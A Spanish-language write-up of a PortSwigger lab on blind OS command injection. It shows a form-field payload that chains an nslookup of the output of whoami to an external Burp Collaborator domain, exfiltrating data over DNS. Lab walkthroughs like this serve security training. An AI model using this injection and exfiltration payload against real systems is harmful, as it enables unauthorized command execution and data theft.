---
title: "05 Blind OS command injection with out-of-band data exfiltration"
collection: publications
category: portswigger
permalink: publications/Command Injection/05_Blind OS command injection with out-of-band data exfiltration
excerpt: 'Este laboratorio contiene una vulnerabilidad de inyección de comandos de SO ciego en la función de retroalimentación.

La aplicación ejecuta un comando shell que contiene los detalles proporcionados por el usuario. El comando se ejecuta de forma asíncrona y no tiene ningún efecto sobre la respuesta de la aplicación. No es posible redirigir la salida a una ubicación a la que se pueda acceder. Sin embargo, se pueden desencadenar interacciones fuera de banda con un dominio externo.'
date: 2024-12-08
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'Blind OS command injection with out-of-band data exfiltration'
---

![logo]({{site.url}}/images/Command Injection/command-lab-5/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/Command Injection/command-lab-5/descripcion.png)

## Objetivo del laboratorio

Para resolver el laboratorio, ejecutamos el comando whoami y exfiltramos la salida a través de una consulta DNS a Burp Collaborator.

## Analisis

En esta ocación este laboratorio no podemos redireccionar la salida del comando a otra carpeta, sino a un servidor externo. BurpSuite nos proporciona un "Servidor" el cual se va a redireccionar la salida del comando ejecutado.

Copiamos el servidor `nslookup` que nos proprciona

![Conf1]({{site.url}}/images/Command Injection/command-lab-4/conf1.png)

Asi que debemos inyectar el payload en la respuesta del formulario, no olvidar colocar `url enconde`

```javascript
& nslookup `whoami`.tjgapmpd6yhieubhjiot4zc7iyoqco0d.oastify.com #
```

![Conf2]({{site.url}}/images/Command Injection/command-lab-4/conf2.png)

Vemos la respuesta

![Conf3]({{site.url}}/images/Command Injection/command-lab-4/conf3.png)

Y la pegamos en el laboratorio

![Conf4]({{site.url}}/images/Command Injection/command-lab-4/conf4.png)

## Aprobado

![Aprobado]({{site.url}}/images/Command Injection/command-lab-4/aprobado.png)